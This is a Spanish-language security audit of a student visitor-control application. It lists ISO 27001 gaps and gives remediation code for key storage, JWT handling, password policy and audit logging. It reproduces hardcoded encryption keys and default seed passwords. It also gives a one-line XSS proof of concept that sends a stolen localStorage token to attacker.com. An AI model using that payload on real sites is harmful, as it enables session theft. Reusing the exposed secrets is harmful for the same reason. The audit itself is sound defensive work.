# INFORME DE AUDITORÍA DE SEGURIDAD Y ARQUITECTURA
## AF Visitor System - Proyecto de Grado de Ingeniería

**Fecha**: Marzo 2026  
**Auditor**: Análisis de Seguridad Senior  
**Alcance**: Auditoría completa de seguridad, cumplimiento ISO 27001 y arquitectura Clean Architecture

---

## RESUMEN EJECUTIVO

### Hallazgos Críticos Identificados
- **Críticos**: 8 vulnerabilidades que requieren atención inmediata
- **Altos**: 12 riesgos de seguridad significativos
- **Medios**: 15 mejoras recomendadas

### Estado General de Seguridad
**Calificación**: ⚠️ **REQUIERE MEJORAS CRÍTICAS**

El sistema presenta una base arquitectónica sólida con Clean Architecture y encriptación implementada, pero tiene vulnerabilidades críticas en:
1. Gestión de secretos hardcodeados en Electron
2. Almacenamiento inseguro de JWT en localStorage
3. Contraseñas por defecto sin política de cambio obligatorio
4. Falta de auditoría completa de eventos de seguridad
5. Exposición de claves de encriptación en código fuente

---

## 1. EVALUACIÓN ISO 27001

### 1.1 Control de Acceso (A.9) - RBAC

#### Estado Actual
✅ **Fortalezas**:
- Modelo RBAC implementado con 3 roles claramente definidos
- Middleware de autorización funcional (`verifyToken`, `isAdmin`, `verifyAuditor`, `denyAuditorOnly`)
- Separación de responsabilidades entre Admin, Guard y Auditor

❌ **Brechas Críticas**:


**CRÍTICO-1**: Contraseñas por defecto sin expiración
```typescript
// server/src/utils/seeder.ts - Líneas 42-48
await User.create({ username: 'Admin@trebol.com', password: hashedAdmin, role: 'admin' });
await User.create({ username: 'guard', password: hashedGuard, role: 'guard' });
await User.create({ username: 'admin', password: await bcrypt.hash('admin123', 8), role: 'admin' });
await User.create({ username: 'demo', password: hashedDemo, role: 'admin' });
await User.create({ username: 'auditor', password: hashedAuditor, role: 'auditor' });
```
**Impacto**: Usuarios con contraseñas conocidas públicamente ('admin123', 'guard123', 'demo123', 'audit2026')  
**Riesgo ISO 27001**: Incumplimiento de A.9.2.1 (Registro y cancelación de usuarios), A.9.3.1 (Uso de información de autenticación secreta)

**CRÍTICO-2**: Sin gestión de usuarios en UI
- No existe interfaz para crear/modificar/eliminar usuarios
- No hay proceso de onboarding seguro
- Imposible cambiar contraseñas desde la aplicación (excepto reset password incompleto)

**CRÍTICO-3**: Sin política de contraseñas
```typescript
// server/src/schemas/auth.schema.ts
password: z.string().min(1, 'Password is required').max(200, 'Password too long')
```
**Falta**:
- Complejidad mínima (mayúsculas, minúsculas, números, símbolos)
- Longitud mínima adecuada (actualmente solo 1 carácter)
- Validación contra contraseñas comunes
- Expiración de contraseñas

**ALTO-1**: Sin bloqueo de cuenta por intentos fallidos
- Rate limiting implementado pero sin bloqueo permanente de cuenta
- No hay tracking de intentos fallidos por usuario


**ALTO-2**: Sin autenticación multifactor (MFA)
- Sistema crítico de control de acceso físico sin 2FA
- Riesgo de compromiso de credenciales

#### Recomendaciones A.9
1. **Inmediato**: Forzar cambio de contraseña en primer login
2. **Inmediato**: Implementar política de contraseñas robusta
3. **Corto plazo**: Crear UI de gestión de usuarios (solo Admin)
4. **Corto plazo**: Implementar bloqueo de cuenta tras N intentos
5. **Mediano plazo**: Agregar MFA (TOTP/SMS)
6. **Mediano plazo**: Implementar rotación de contraseñas cada 90 días

---

### 1.2 Gestión Criptográfica (A.10)

#### Estado Actual de Claves

**CRÍTICO-4**: Claves hardcodeadas en Electron
```typescript
// electron/main.ts - Líneas 200-205
env: { 
    DB_ENCRYPTION_KEY: 'e44719f04d5a961af39f640854d985396e8178daf4c9300fdbca6848840eeb52',
    ENCRYPTION_KEY: '301f7eae998b3bcddc49173a819699ef521b2bc7402da2d70f52a078b9b30d36',
    JWT_SECRET: '42f2934ddb4d4ab6f4fed97053a35143bc6406204c28857b12ae5eea6ede23bd...',
    BACKUP_PASSWORD: '2333815119ad6a3b50ba48bd394f5e77e20557482815631c85c442af5572469d'
}
```
**Impacto CRÍTICO**: 
- Claves expuestas en código fuente y repositorio Git
- Cualquiera con acceso al código puede desencriptar toda la base de datos
- Violación directa de A.10.1.1 (Política de uso de controles criptográficos)
- Violación de A.10.1.2 (Gestión de claves)


**CRÍTICO-5**: JWT Secret expuesto
```typescript
// server/src/config/AppConfig.ts (inferido)
jwtSecret: process.env.JWT_SECRET || 'default_secret'
```
Si no hay `.env`, usa un secreto por defecto predecible.

**ALTO-3**: Bcrypt con solo 8 rounds
```typescript
// server/src/utils/seeder.ts
const hashedAdmin = await bcrypt.hash('Trebol123*', 8);
```
**Recomendación**: Mínimo 12 rounds (OWASP recomienda 10-12 para 2024+)

**ALTO-4**: Sin rotación de claves
- No existe mecanismo para rotar claves de encriptación
- Si una clave se compromete, no hay proceso de re-encriptación

#### Análisis de Encriptación Implementada

✅ **Fortalezas**:
```typescript
// server/src/utils/Encryption.ts
- AES-256-GCM (authenticated encryption) ✓
- IV aleatorio por mensaje ✓
- Auth tag para integridad ✓
- SHA-256 para hashing de cédulas ✓
```

❌ **Debilidades**:
- Clave de 32 bytes en hex (correcto) pero mal gestionada
- Sin derivación de claves (KDF) desde password maestro
- Sin HSM o key vault para producción

#### Gestión de Claves Recomendada

**Para Desarrollo**:
```bash
# .env (NUNCA en Git)
DB_ENCRYPTION_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
ENCRYPTION_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
JWT_SECRET=$(node -e "console.log(require('crypto').randomBytes(64).toString('hex'))")
```


**Para Producción (Electron)**:
```typescript
// Opción 1: Usar electron-store con encriptación
import Store from 'electron-store';
const store = new Store({ encryptionKey: 'user-provided-master-password' });

// Opción 2: Usar keytar (acceso al keychain del SO)
import keytar from 'keytar';
const dbKey = await keytar.getPassword('visitor-system', 'db-encryption-key');

// Opción 3: Solicitar al usuario en primer arranque
dialog.showMessageBox({
    type: 'warning',
    title: 'Configuración Inicial',
    message: 'Ingrese la clave maestra de encriptación',
    // Guardar en keychain del SO
});
```

**Para Producción (Servidor Web)**:
- AWS Secrets Manager / Azure Key Vault
- HashiCorp Vault
- Variables de entorno inyectadas en runtime (Kubernetes secrets)

#### Recomendaciones A.10
1. **INMEDIATO**: Remover claves hardcodeadas de `electron/main.ts`
2. **INMEDIATO**: Agregar `.env` al `.gitignore` y verificar historial de Git
3. **INMEDIATO**: Rotar TODAS las claves actuales (están comprometidas)
4. **Corto plazo**: Implementar keytar o electron-store para Electron
5. **Corto plazo**: Aumentar bcrypt rounds a 12
6. **Mediano plazo**: Implementar rotación de claves con re-encriptación
7. **Mediano plazo**: Usar KDF (PBKDF2/Argon2) para derivar claves

---

### 1.3 Registro y Supervisión (A.12.4)

#### Estado Actual de Auditoría

**ALTO-5**: Auditoría incompleta


El sistema tiene un módulo de auditoría pero no captura todos los eventos críticos.

#### Eventos que DEBE capturar el Auditor (ISO 27001 A.12.4.1)

**Eventos de Autenticación**:
- ✅ Login exitoso (implementado)
- ✅ Login fallido (implementado)
- ❌ Logout (NO implementado)
- ❌ Cambio de contraseña (NO implementado)
- ❌ Reset de contraseña (NO implementado)
- ❌ Bloqueo de cuenta (NO existe la funcionalidad)
- ❌ Desbloqueo de cuenta (NO existe la funcionalidad)

**Eventos de Autorización**:
- ❌ Intento de acceso denegado (403) - NO registrado
- ❌ Escalación de privilegios (cambio de rol) - NO existe funcionalidad
- ❌ Acceso a funciones administrativas - NO registrado específicamente

**Eventos de Datos**:
- ✅ Check-in de visitante (implementado)
- ✅ Check-out de visitante (implementado)
- ✅ Admisión de visitante en espera (implementado)
- ❌ Creación de visitante - NO registrado
- ❌ Modificación de visitante - NO registrado
- ❌ Eliminación de visitante - NO registrado
- ❌ Exportación de datos (PDF/Excel) - NO registrado
- ❌ Creación de backup - NO registrado
- ❌ Restauración de backup - NO registrado

**Eventos de Sistema**:
- ❌ Inicio de aplicación - NO registrado
- ❌ Cierre de aplicación - NO registrado
- ❌ Errores críticos - NO registrado sistemáticamente
- ❌ Cambios de configuración - NO registrado


#### Estructura de Log de Auditoría Recomendada

```typescript
interface AuditLog {
    id: number;
    timestamp: Date;
    userId: number;
    username: string;
    role: 'admin' | 'guard' | 'auditor';
    action: AuditAction;
    resource: string;          // 'visit', 'visitor', 'user', 'backup', 'system'
    resourceId?: string;        // ID del recurso afectado
    ipAddress: string;
    userAgent: string;
    status: 'success' | 'failure' | 'denied';
    details?: string;           // JSON con detalles adicionales
    severity: 'low' | 'medium' | 'high' | 'critical';
}

enum AuditAction {
    // Autenticación
    LOGIN = 'auth.login',
    LOGOUT = 'auth.logout',
    LOGIN_FAILED = 'auth.login_failed',
    PASSWORD_CHANGE = 'auth.password_change',
    PASSWORD_RESET = 'auth.password_reset',
    
    // Visitantes
    VISITOR_CREATE = 'visitor.create',
    VISITOR_UPDATE = 'visitor.update',
    VISITOR_DELETE = 'visitor.delete',
    VISITOR_VIEW = 'visitor.view',
    
    // Visitas
    VISIT_CHECKIN = 'visit.checkin',
    VISIT_CHECKOUT = 'visit.checkout',
    VISIT_ADMIT = 'visit.admit',
    VISIT_VIEW = 'visit.view',
    
    // Administración
    USER_CREATE = 'admin.user_create',
    USER_UPDATE = 'admin.user_update',
    USER_DELETE = 'admin.user_delete',
    BACKUP_CREATE = 'admin.backup_create',
    BACKUP_RESTORE = 'admin.backup_restore',
    DATA_EXPORT = 'admin.data_export',
    
    // Sistema
    SYSTEM_START = 'system.start',
    SYSTEM_STOP = 'system.stop',
    CONFIG_CHANGE = 'system.config_change',
    ERROR_CRITICAL = 'system.error_critical',
    
    // Seguridad
    ACCESS_DENIED = 'security.access_denied',
    ACCOUNT_LOCKED = 'security.account_locked',
    SUSPICIOUS_ACTIVITY = 'security.suspicious_activity'
}
```


#### Implementación de Middleware de Auditoría

```typescript
// server/src/middleware/audit.ts
export const auditMiddleware = (action: AuditAction, resource: string) => {
    return async (req: Request, res: Response, next: NextFunction) => {
        const startTime = Date.now();
        
        // Capturar respuesta
        const originalSend = res.send;
        res.send = function(data) {
            const duration = Date.now() - startTime;
            const status = res.statusCode >= 200 && res.statusCode < 300 ? 'success' : 'failure';
            
            // Crear log de auditoría
            AuditLog.create({
                userId: req.user?.id,
                username: req.user?.username,
                role: req.user?.role,
                action,
                resource,
                resourceId: req.params.id || req.body.id,
                ipAddress: req.ip,
                userAgent: req.get('user-agent'),
                status,
                details: JSON.stringify({ 
                    method: req.method, 
                    path: req.path,
                    duration 
                }),
                severity: determineSeverity(action, status)
            });
            
            return originalSend.call(this, data);
        };
        
        next();
    };
};

// Uso en rutas
router.post('/visits/checkin', 
    verifyToken, 
    denyAuditorOnly, 
    auditMiddleware(AuditAction.VISIT_CHECKIN, 'visit'),
    validate(checkInSchema), 
    asyncHandler(VisitCleanController.checkIn)
);
```

#### Recomendaciones A.12.4
1. **INMEDIATO**: Implementar auditoría de logout
2. **INMEDIATO**: Registrar todos los intentos de acceso denegado (403)
3. **Corto plazo**: Implementar middleware de auditoría global
4. **Corto plazo**: Agregar auditoría de exportaciones de datos
5. **Mediano plazo**: Implementar alertas en tiempo real para eventos críticos
6. **Mediano plazo**: Retención de logs según política (mínimo 1 año para ISO 27001)

---

## 2. VULNERABILIDADES CRÍTICAS DEL STACK


### 2.1 Vulnerabilidades React + Electron + JWT

**CRÍTICO-6**: JWT en localStorage (XSS vulnerable)
```typescript
// client/src/context/AuthContext.tsx - Líneas 18-21
localStorage.setItem('token', token);
localStorage.setItem('role', userData.role);
localStorage.setItem('username', userData.username);
```

**Impacto**:
- Si hay XSS, el atacante puede robar el token
- localStorage es accesible desde cualquier script
- No hay protección HttpOnly como en cookies

**Vectores de Ataque XSS en el sistema**:
1. Nombres de visitantes sin sanitización
2. Notas de visitas sin sanitización
3. Empresas sin sanitización
4. Cualquier campo de texto libre

**Prueba de concepto**:
```javascript
// Si un atacante ingresa esto como nombre de visitante:
<img src=x onerror="fetch('https://attacker.com/steal?token='+localStorage.getItem('token'))">
```

**CRÍTICO-7**: IPC de Electron sin validación
```typescript
// electron/main.ts
// No hay validación de mensajes IPC
// Si se implementa IPC en el futuro, debe validarse
```

**Riesgo potencial**: Si se agrega comunicación IPC entre renderer y main process sin validación, podría permitir:
- Ejecución de código arbitrario
- Acceso al sistema de archivos
- Bypass de CSP

**ALTO-6**: Sin Content Security Policy (CSP)
```typescript
// electron/main.ts - BrowserWindow config
webPreferences: {
    preload: path.join(__dirname, 'preload.js'),
    nodeIntegration: false,  // ✓ Correcto
    contextIsolation: true,  // ✓ Correcto
    // ❌ Falta: CSP headers
}
```


**Solución Recomendada para JWT**:

**Opción 1: Cookies HttpOnly (Recomendado para web)**
```typescript
// Backend
res.cookie('token', token, {
    httpOnly: true,      // No accesible desde JavaScript
    secure: true,        // Solo HTTPS
    sameSite: 'strict',  // Protección CSRF
    maxAge: 900000       // 15 minutos
});

// Frontend - El token se envía automáticamente
// No necesitas localStorage
```

**Opción 2: Memory storage + Refresh token (Recomendado para Electron)**
```typescript
// client/src/services/auth.ts
class AuthService {
    private accessToken: string | null = null;  // En memoria
    private refreshToken: string | null = null; // En localStorage (menos crítico)
    
    setTokens(access: string, refresh: string) {
        this.accessToken = access;  // Solo en memoria
        localStorage.setItem('refreshToken', refresh);
    }
    
    getAccessToken() {
        return this.accessToken;
    }
    
    async refreshAccessToken() {
        const refresh = localStorage.getItem('refreshToken');
        // Llamar a /auth/refresh
    }
}
```

**ALTO-7**: Sin sanitización de inputs
```typescript
// client/src/components/VisitForm.tsx
// Los inputs no están sanitizados antes de renderizar
// Usar DOMPurify o similar
```

**Solución**:
```typescript
import DOMPurify from 'dompurify';

const sanitizedName = DOMPurify.sanitize(visitorName);
```

**MEDIO-1**: Sin validación de tipos de archivo en upload de fotos
```typescript
// client/src/components/PhotoCapture.tsx
// Acepta cualquier imagen sin validar tipo/tamaño
```

---

### 2.2 Vulnerabilidades en Reset de Contraseña

**ALTO-8**: Reset token sin expiración corta
```typescript
// server/src/models/User.ts
resetToken: string | null;
resetTokenExpiry: Date | null;
```


**Problemas identificados**:
1. No hay límite de tiempo para usar el token (si expiry no se valida correctamente)
2. Token no se invalida después de uso
3. No hay rate limiting en el endpoint de reset
4. No hay notificación al usuario cuando se solicita reset

**ALTO-9**: Envío de email no implementado
```typescript
// server/src/application/usecases/auth/ForgotPassword.usecase.ts
// Genera token pero no envía email
// El token queda en la BD sin que el usuario lo sepa
```

**Riesgo**: 
- Usuario no sabe que alguien solicitó reset de su contraseña
- Atacante puede intentar adivinar tokens
- Sin notificación, no hay detección de ataques

**Solución Completa**:
```typescript
// 1. Generar token seguro
const resetToken = crypto.randomBytes(32).toString('hex');
const hashedToken = crypto.createHash('sha256').update(resetToken).digest('hex');

// 2. Guardar hash (no el token en claro)
user.resetToken = hashedToken;
user.resetTokenExpiry = new Date(Date.now() + 15 * 60 * 1000); // 15 minutos

// 3. Enviar email
await emailService.send({
    to: user.email,
    subject: 'Recuperación de contraseña - AF Visitor System',
    html: `
        <p>Solicitaste recuperar tu contraseña.</p>
        <p>Haz clic aquí: <a href="${APP_URL}/reset-password?token=${resetToken}">Recuperar</a></p>
        <p>Este enlace expira en 15 minutos.</p>
        <p>Si no solicitaste esto, ignora este email.</p>
    `
});

// 4. En reset, validar y usar una sola vez
if (user.resetTokenExpiry < new Date()) {
    throw new Error('Token expirado');
}
user.resetToken = null;  // Invalidar inmediatamente
user.resetTokenExpiry = null;
```

**MEDIO-2**: Sin rate limiting en forgot-password
```typescript
// server/src/routes/auth-clean.routes.ts
router.post('/v1/auth/forgot-password', authLimiter, ...);
```
Usa el mismo rate limiter general, debería ser más restrictivo.

---

### 2.3 Vulnerabilidades de Inyección SQL

**BAJO-1**: Sequelize ORM protege contra SQL injection
✅ El uso de Sequelize con parámetros preparados protege contra SQLi
✅ No se encontró concatenación directa de SQL

**Recomendación**: Mantener uso de ORM, evitar `sequelize.query()` con strings concatenados.

---

## 3. EVALUACIÓN DE CLEAN ARCHITECTURE


### 3.1 Análisis de Capas Actuales

```
┌─────────────────────────────────────────────────────────┐
│                    PRESENTATION                          │
│  Controllers, Routes, Middlewares (Express)             │
│  ✅ Correcto: Maneja HTTP, validación, autenticación   │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                    APPLICATION                           │
│  Use Cases (Business Logic)                             │
│  ✅ Correcto: Lógica de negocio pura                   │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                    DOMAIN                                │
│  Entities, Value Objects, Interfaces                    │
│  ✅ Correcto: Sin dependencias externas                │
└─────────────────────────────────────────────────────────┘
                          ↓
┌─────────────────────────────────────────────────────────┐
│                    INFRASTRUCTURE                        │
│  Repositories, Database, External Services              │
│  ✅ Correcto: Implementa interfaces del dominio        │
└─────────────────────────────────────────────────────────┘
```

### 3.2 Violaciones de Clean Architecture Detectadas

**MEDIO-3**: Middlewares de seguridad en capa de presentación
```typescript
// server/src/middleware/auth.ts
// Depende directamente de JWT y Express
import jwt from 'jsonwebtoken';
import { Request, Response, NextFunction } from 'express';
```

**Problema**: Los middlewares están acoplados a Express y JWT.

**Solución**: Crear abstracciones en el dominio.

```typescript
// domain/services/IAuthenticationService.ts
export interface IAuthenticationService {
    verifyToken(token: string): Promise<UserPayload>;
    generateToken(user: User): Promise<string>;
    validatePermissions(user: UserPayload, resource: string, action: string): boolean;
}

// infrastructure/services/JWTAuthenticationService.ts
export class JWTAuthenticationService implements IAuthenticationService {
    constructor(private jwtSecret: string) {}
    
    async verifyToken(token: string): Promise<UserPayload> {
        return jwt.verify(token, this.jwtSecret) as UserPayload;
    }
    
    // ... implementación
}

// presentation/middleware/auth.ts (ahora desacoplado)
export const createAuthMiddleware = (authService: IAuthenticationService) => {
    return async (req: Request, res: Response, next: NextFunction) => {
        const token = req.headers['authorization']?.split(' ')[1];
        if (!token) return res.status(401).json({...});
        
        try {
            const user = await authService.verifyToken(token);
            req.user = user;
            next();
        } catch (error) {
            return res.status(401).json({...});
        }
    };
};
```


**MEDIO-4**: Validación con Zod acoplada a presentación
```typescript
// server/src/middleware/validate.ts
import { z } from 'zod';
```

**Solución**: Crear capa de validación en dominio.

```typescript
// domain/validation/IValidator.ts
export interface IValidator<T> {
    validate(data: unknown): ValidationResult<T>;
}

export type ValidationResult<T> = 
    | { success: true; data: T }
    | { success: false; errors: ValidationError[] };

// infrastructure/validation/ZodValidator.ts
export class ZodValidator<T> implements IValidator<T> {
    constructor(private schema: z.ZodSchema<T>) {}
    
    validate(data: unknown): ValidationResult<T> {
        const result = this.schema.safeParse(data);
        if (result.success) {
            return { success: true, data: result.data };
        }
        return { 
            success: false, 
            errors: result.error.errors.map(e => ({
                field: e.path.join('.'),
                message: e.message
            }))
        };
    }
}

// presentation/middleware/validate.ts
export const validate = <T>(validator: IValidator<T>) => {
    return (req: Request, res: Response, next: NextFunction) => {
        const result = validator.validate(req.body);
        if (!result.success) {
            return res.status(400).json({ errors: result.errors });
        }
        req.validatedData = result.data;
        next();
    };
};
```

**MEDIO-5**: Rate Limiting acoplado a Express
```typescript
// server/src/middleware/rateLimiter.ts
import rateLimit from 'express-rate-limit';
```

**Solución**: Abstraer rate limiting.

```typescript
// domain/services/IRateLimiter.ts
export interface IRateLimiter {
    checkLimit(identifier: string, action: string): Promise<RateLimitResult>;
}

export type RateLimitResult = 
    | { allowed: true }
    | { allowed: false; retryAfter: number };

// infrastructure/services/MemoryRateLimiter.ts
export class MemoryRateLimiter implements IRateLimiter {
    private requests: Map<string, number[]> = new Map();
    
    async checkLimit(identifier: string, action: string): Promise<RateLimitResult> {
        const key = `${identifier}:${action}`;
        const now = Date.now();
        const windowMs = 60000; // 1 minuto
        const maxRequests = 100;
        
        const timestamps = this.requests.get(key) || [];
        const recentRequests = timestamps.filter(t => now - t < windowMs);
        
        if (recentRequests.length >= maxRequests) {
            const oldestRequest = Math.min(...recentRequests);
            const retryAfter = Math.ceil((oldestRequest + windowMs - now) / 1000);
            return { allowed: false, retryAfter };
        }
        
        recentRequests.push(now);
        this.requests.set(key, recentRequests);
        return { allowed: true };
    }
}
```

### 3.3 Estructura Recomendada de Seguridad en Clean Architecture

```
server/src/
├── domain/
│   ├── entities/
│   │   ├── User.entity.ts
│   │   ├── Visit.entity.ts
│   │   └── AuditLog.entity.ts
│   ├── services/                    # ← Interfaces de seguridad
│   │   ├── IAuthenticationService.ts
│   │   ├── IAuthorizationService.ts
│   │   ├── IEncryptionService.ts
│   │   ├── IRateLimiter.ts
│   │   └── IAuditService.ts
│   └── validation/
│       └── IValidator.ts
│
├── application/
│   ├── usecases/
│   │   ├── auth/
│   │   │   ├── Login.usecase.ts     # ← Usa IAuthenticationService
│   │   │   ├── Logout.usecase.ts
│   │   │   └── ChangePassword.usecase.ts
│   │   └── visits/
│   │       └── CheckIn.usecase.ts   # ← Usa IAuditService
│   └── dto/
│
├── infrastructure/
│   ├── services/                    # ← Implementaciones concretas
│   │   ├── JWTAuthenticationService.ts
│   │   ├── RBACAuthorizationService.ts
│   │   ├── AESEncryptionService.ts
│   │   ├── MemoryRateLimiter.ts
│   │   └── DatabaseAuditService.ts
│   ├── validation/
│   │   └── ZodValidator.ts
│   └── repositories/
│
└── presentation/
    ├── middleware/                  # ← Adaptadores de Express
    │   ├── auth.middleware.ts       # ← Usa IAuthenticationService
    │   ├── authorization.middleware.ts
    │   ├── validation.middleware.ts
    │   ├── rateLimit.middleware.ts
    │   └── audit.middleware.ts
    ├── controllers/
    └── routes/
```

### 3.4 Dependency Injection Container

```typescript
// shared/Container.ts (mejorado)
export class Container {
    // Services
    private authService: IAuthenticationService;
    private authzService: IAuthorizationService;
    private encryptionService: IEncryptionService;
    private rateLimiter: IRateLimiter;
    private auditService: IAuditService;
    
    constructor() {
        // Inicializar servicios de infraestructura
        this.encryptionService = new AESEncryptionService(config.encryptionKey);
        this.authService = new JWTAuthenticationService(
            config.jwtSecret,
            this.encryptionService
        );
        this.authzService = new RBACAuthorizationService();
        this.rateLimiter = new MemoryRateLimiter();
        this.auditService = new DatabaseAuditService(auditRepository);
    }
    
    // Getters para inyectar en middlewares y use cases
    getAuthService() { return this.authService; }
    getAuthzService() { return this.authzService; }
    getRateLimiter() { return this.rateLimiter; }
    getAuditService() { return this.auditService; }
}

// app.ts
const container = new Container();

// Crear middlewares con dependencias inyectadas
const authMiddleware = createAuthMiddleware(container.getAuthService());
const rateLimitMiddleware = createRateLimitMiddleware(container.getRateLimiter());

app.use('/api', rateLimitMiddleware);
app.use('/api/v1/visits', authMiddleware, visitRoutes);
```

---

## 4. PLAN DE ACCIÓN TÉCNICO PRIORIZADO


### 🔴 PRIORIDAD CRÍTICA (Implementar en 1-2 días)

#### C-1: Remover claves hardcodeadas de Electron
**Archivo**: `electron/main.ts`
**Acción**:
```typescript
// ANTES (INSEGURO)
env: { 
    DB_ENCRYPTION_KEY: 'e44719f04d5a961af39f640854d985396e8178daf4c9300fdbca6848840eeb52',
    // ...
}

// DESPUÉS (SEGURO)
import keytar from 'keytar';

async function getOrCreateEncryptionKey() {
    let key = await keytar.getPassword('visitor-system', 'db-encryption-key');
    if (!key) {
        // Primera vez: solicitar al usuario o generar
        const result = await dialog.showMessageBox({
            type: 'warning',
            title: 'Configuración Inicial de Seguridad',
            message: 'Ingrese la clave maestra de encriptación',
            detail: 'Esta clave protegerá todos los datos. Guárdela en un lugar seguro.',
            buttons: ['Generar Automáticamente', 'Ingresar Manualmente']
        });
        
        if (result.response === 0) {
            key = crypto.randomBytes(32).toString('hex');
        } else {
            // Mostrar input dialog
            key = await promptForKey();
        }
        
        await keytar.setPassword('visitor-system', 'db-encryption-key', key);
    }
    return key;
}

// En startServer()
const dbKey = await getOrCreateEncryptionKey();
const jwtSecret = await keytar.getPassword('visitor-system', 'jwt-secret') || generateAndSaveSecret();

env: {
    DB_ENCRYPTION_KEY: dbKey,
    JWT_SECRET: jwtSecret,
    // ...
}
```

**Dependencia**: `npm install keytar`

#### C-2: Rotar TODAS las claves actuales
**Acción**:
1. Generar nuevas claves:
```bash
node -e "console.log('DB_ENCRYPTION_KEY=' + require('crypto').randomBytes(32).toString('hex'))"
node -e "console.log('ENCRYPTION_KEY=' + require('crypto').randomBytes(32).toString('hex'))"
node -e "console.log('JWT_SECRET=' + require('crypto').randomBytes(64).toString('hex'))"
```

2. Actualizar `.env` (NUNCA commitear)
3. Re-encriptar base de datos existente
4. Invalidar todos los tokens JWT actuales

#### C-3: Migrar JWT de localStorage a memoria
**Archivo**: `client/src/services/auth.service.ts` (crear)
```typescript
class AuthService {
    private static instance: AuthService;
    private accessToken: string | null = null;
    private refreshToken: string | null = null;
    
    private constructor() {
        // Cargar refresh token de localStorage al iniciar
        this.refreshToken = localStorage.getItem('refreshToken');
    }
    
    static getInstance() {
        if (!AuthService.instance) {
            AuthService.instance = new AuthService();
        }
        return AuthService.instance;
    }
    
    setTokens(access: string, refresh: string) {
        this.accessToken = access;  // Solo en memoria
        this.refreshToken = refresh;
        localStorage.setItem('refreshToken', refresh);  // Menos crítico
    }
    
    getAccessToken() {
        return this.accessToken;
    }
    
    async refreshAccessToken() {
        if (!this.refreshToken) throw new Error('No refresh token');
        
        const response = await axios.post('/api/v1/auth/refresh', {
            refreshToken: this.refreshToken
        });
        
        this.accessToken = response.data.accessToken;
        return this.accessToken;
    }
    
    clearTokens() {
        this.accessToken = null;
        this.refreshToken = null;
        localStorage.removeItem('refreshToken');
    }
}

export default AuthService.getInstance();
```

**Actualizar**: `client/src/services/api.v1.ts`
```typescript
import authService from './auth.service';

api.interceptors.request.use((config) => {
    const token = authService.getAccessToken();
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
});

// Interceptor para refresh automático
api.interceptors.response.use(
    response => response,
    async error => {
        if (error.response?.status === 401 && !error.config._retry) {
            error.config._retry = true;
            try {
                const newToken = await authService.refreshAccessToken();
                error.config.headers.Authorization = `Bearer ${newToken}`;
                return api(error.config);
            } catch (refreshError) {
                authService.clearTokens();
                window.location.href = '/login';
                return Promise.reject(refreshError);
            }
        }
        return Promise.reject(error);
    }
);
```

#### C-4: Implementar política de contraseñas robusta
**Archivo**: `server/src/schemas/auth.schema.ts`
```typescript
const passwordSchema = z.string()
    .min(12, 'La contraseña debe tener al menos 12 caracteres')
    .max(128, 'La contraseña es demasiado larga')
    .regex(/[a-z]/, 'Debe contener al menos una minúscula')
    .regex(/[A-Z]/, 'Debe contener al menos una MAYÚSCULA')
    .regex(/[0-9]/, 'Debe contener al menos un número')
    .regex(/[^a-zA-Z0-9]/, 'Debe contener al menos un símbolo especial')
    .refine(
        (password) => !commonPasswords.includes(password.toLowerCase()),
        'Esta contraseña es demasiado común'
    );

export const loginSchema = z.object({
    username: z.string().min(1).max(100),
    password: z.string().min(1).max(200)  // No validar en login
});

export const changePasswordSchema = z.object({
    currentPassword: z.string(),
    newPassword: passwordSchema
});

// Lista de contraseñas comunes (top 1000)
const commonPasswords = [
    'password', '123456', '12345678', 'qwerty', 'abc123',
    'monkey', '1234567', 'letmein', 'trustno1', 'dragon',
    // ... agregar más
];
```

#### C-5: Forzar cambio de contraseña en primer login
**Archivo**: `server/src/models/User.ts`
```typescript
class User extends Model {
    declare id: CreationOptional<number>;
    declare username: string;
    declare password: string;
    declare role: CreationOptional<'admin' | 'guard' | 'auditor'>;
    declare mustChangePassword: CreationOptional<boolean>;  // ← NUEVO
    declare passwordChangedAt: CreationOptional<Date | null>;  // ← NUEVO
    declare resetToken: CreationOptional<string | null>;
    declare resetTokenExpiry: CreationOptional<Date | null>;
}

User.init({
    // ...
    mustChangePassword: {
        type: DataTypes.BOOLEAN,
        defaultValue: true  // Por defecto debe cambiar
    },
    passwordChangedAt: {
        type: DataTypes.DATE,
        allowNull: true
    }
}, { /* ... */ });
```

**Middleware**: `server/src/middleware/requirePasswordChange.ts`
```typescript
export const requirePasswordChange = (req: Request, res: Response, next: NextFunction) => {
    const user = req.user as any;
    
    if (user.mustChangePassword) {
        return res.status(403).json(ResponseBuilder.error(
            'PASSWORD_CHANGE_REQUIRED',
            'Debe cambiar su contraseña antes de continuar',
            { requirePasswordChange: true }
        ));
    }
    
    next();
};

// Aplicar a todas las rutas excepto /auth/change-password
app.use('/api/v1', verifyToken, requirePasswordChange);
app.use('/api/v1/auth/change-password', verifyToken);  // Sin requirePasswordChange
```

**Frontend**: `client/src/components/PasswordChangeModal.tsx`
```typescript
export const PasswordChangeModal = ({ show, onSuccess }: Props) => {
    const [currentPassword, setCurrentPassword] = useState('');
    const [newPassword, setNewPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');
    
    const handleSubmit = async () => {
        if (newPassword !== confirmPassword) {
            toast.error('Las contraseñas no coinciden');
            return;
        }
        
        try {
            await axios.post('/api/v1/auth/change-password', {
                currentPassword,
                newPassword
            });
            toast.success('Contraseña cambiada exitosamente');
            onSuccess();
        } catch (error) {
            toast.error('Error al cambiar contraseña');
        }
    };
    
    return (
        <Modal show={show} onClose={() => {}} closable={false}>
            <h2>Cambio de Contraseña Obligatorio</h2>
            <p>Por seguridad, debe cambiar su contraseña antes de continuar.</p>
            {/* Formulario */}
        </Modal>
    );
};
```

---

### 🟠 PRIORIDAD ALTA (Implementar en 1 semana)


#### A-1: Implementar sanitización de inputs (XSS)
**Dependencia**: `npm install dompurify isomorphic-dompurify`

**Archivo**: `client/src/utils/sanitize.ts`
```typescript
import DOMPurify from 'isomorphic-dompurify';

export const sanitizeInput = (input: string): string => {
    return DOMPurify.sanitize(input, {
        ALLOWED_TAGS: [],  // No permitir HTML
        ALLOWED_ATTR: []
    });
};

export const sanitizeHTML = (html: string): string => {
    return DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []
    });
};
```

